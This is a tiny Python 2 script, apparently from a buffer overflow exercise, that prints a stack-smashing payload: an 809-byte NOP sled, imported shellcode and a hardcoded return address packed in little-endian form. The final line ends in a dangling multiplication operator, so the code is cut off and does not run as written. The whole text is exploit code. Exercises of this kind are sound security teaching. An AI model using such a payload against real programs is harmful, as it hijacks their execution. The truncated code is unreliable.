from shellcode import shellcode
from struct import pack
retaddr = 0xbffede00
print "\x90"*809+shellcode + pack("<I",retaddr)*